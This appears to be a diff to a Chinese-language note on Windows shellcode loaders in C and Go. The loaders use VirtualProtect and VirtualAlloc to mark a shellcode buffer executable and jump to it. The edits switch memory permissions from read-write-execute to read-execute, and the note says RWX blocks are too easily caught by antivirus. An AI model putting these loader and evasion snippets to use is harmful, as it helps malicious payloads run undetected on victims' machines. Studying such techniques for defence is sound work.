@@ -53,23 +53,23 @@ int main() {
 
 // function signature
 BOOL VirtualProtect{ 
-    LPVOID lpAddress,       // 内存块起始地址
-    DWORD dwsize,           // 内存块长度
-    DWORD flNewProtect,     // 设置内存块属性 0x40(PAGE_EXECUTE_READWRITE)
-    PDWORD lpflOldProtect   // 内存块原始属性保存地址
+    LPVOID lpAddress,
+    DWORD dwsize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
 }
 ```
 
 调用Win32API的VirtualProtect修改数据段为PAGE_EXECUTE_READ权限，或增加预编译指令修改数据段权限
 
-**修改成RX权限就足够了，RWX内存块太明显容易被杀，实际上，仅仅PAGE_EXECUTE权限也是可以正常执行的，X和RX行为类似：[SO](https://stackoverflow.com/questions/47969670/whats-the-difference-between-page-execute-and-page-execute-read)**
+**修改成RX权限就足够了，RWX内存块太敏感。实际上，仅仅PAGE_EXECUTE权限也是可以正常执行的，X和RX行为类似：[SO](https://stackoverflow.com/questions/47969670/whats-the-difference-between-page-execute-and-page-execute-read)**
 
 ```c
 void(*fn)(void);
 fn = (void(*)(void)) & buf;
 
 DWORD oldperm;
-if (!VirtualProtect(&buf, sizeof buf, 0x40, &oldperm)) 
+if (!VirtualProtect(&buf, sizeof buf, 0x20, &oldperm)) 
     return -1;
 fn();
 
@@ -95,7 +95,7 @@ LPVOID VirtualAlloc(
 ```
 
 ```c
-LPVOID lpAlloc = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+LPVOID lpAlloc = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READ);
 memcpy(lpAlloc, buf, sizeof buf);
 ((void(*)())lpAlloc)();
 ```
@@ -121,7 +121,7 @@ var oldperm uint32
 virtualProtect.Call(
     uintptr(unsafe.Pointer(&buf[0])),
     uintptr(len(buf)),
-    uintptr(0x40),
+    uintptr(0x20),
     uintptr(unsafe.Pointer(&oldperm)),
 )
 syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
@@ -145,7 +145,7 @@ func memcpy(base uintptr, buf []byte) {
 	}
 }
 
-addr, _, err := virtualAlloc.Call(0, uintptr(len(buf)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+addr, _, err := virtualAlloc.Call(0, uintptr(len(buf)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READ)
 if addr == 0 {
     panic(err)
 }
@@ -330,7 +330,7 @@ var oldperm uint32
 virtualProtect.Call(
     uintptr(unsafe.Pointer(info)),
     uintptr(unsafe.Sizeof(*info)),
-    uintptr(0x40),
+    uintptr(0x20),
     uintptr(unsafe.Pointer(&oldperm)),
 )
 
@@ -436,7 +436,7 @@ var ptr uintptr = (uintptr)(unsafe.Pointer(&buf[0]))
 virtualProtect.Call(
     *(*uintptr)(unsafe.Pointer(&f)),
     uintptr(unsafe.Sizeof(**(**uintptr)(unsafe.Pointer(&f)))),
-    uintptr(0x40),
+    uintptr(0x20),
     uintptr(unsafe.Pointer(&oldperm)),
 )
 
